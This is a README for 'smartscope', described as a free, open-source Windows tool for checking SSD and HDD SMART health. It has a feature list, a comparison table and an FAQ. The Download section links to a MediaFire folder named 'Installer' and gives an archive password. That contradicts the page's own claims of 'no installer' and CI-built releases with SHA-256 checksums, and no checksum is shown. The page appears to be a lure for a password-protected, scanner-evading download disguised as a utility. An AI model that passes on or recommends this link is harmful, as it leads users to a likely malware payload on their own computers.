# smartscope

🩺 Free, open-source SSD and HDD health checker for Windows — read SMART data and catch failing drives early. 100 MB portable, no ads, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Plain-language verdict** — 30+ SMART attributes become GOOD / CAUTION / BAD per drive, no hex tables to decode
- ✅ **NVMe, SATA and USB** — NVMe health log via storage protocol, SATA SMART via ATA pass-through, blocked USB bridges flagged
- ✅ **Temperature timeline** — per-minute logging for 90 days with tray alerts on threshold crossing (default 55 °C)
- ✅ **Failure early-warning** — weighted score from reallocated, pending sectors and wear leveling trends
- ✅ **Raw attribute drill-down** — raw, normalized and threshold values side by side for every attribute
- ✅ **CSV and JSON export** — one click dumps all drive snapshots for spreadsheets or fleet scripts
- ✅ **100 MB self-contained exe** — no service, no installer, offline; MIT with CI-built SHA-256 releases

## Why smartscope

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **smartscope** | CrystalDiskInfo | Hard Disk Sentinel | HD Tune Pro |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Paid | Paid |
| Open source | **Yes** | No | No | No |
| Plain-language health verdict | **Yes** | Partial | Partial | No |
| Temperature history and alerts | **90 days** | No | Yes | No |
| Raw SMART drill-down | **Yes** | Yes | Yes | Yes |
| Portable, no install | **Yes, 100 MB** | Zip | Installer | Installer |

## FAQ

**how to check SSD health on Windows?**

SMART data exists on every modern drive but Windows buries it, so people find problems after a crash, not before. smartscope reads the same data and translates it into a three-level verdict with a temperature history that shows drives trending hot or worn. It is a 100 MB portable exe, MIT, no ads and fully offline with SHA-256 releases.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark dashboard (#101214, emerald #34D399): drive cards left showing GOOD status and 38 °C, attribute table right with normalized bars.
2. Attribute detail: reallocated-sector chart over 30 days, threshold markers, raw hex values in muted gray, export button.
3. Alert settings: 55 °C threshold slider, tray notification toggle, CSV export path, list of USB bridges that block SMART.

## Download

| Source | Link |
|---|---|
| 💾 **Installer smartscope** | [Installer smartscope](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).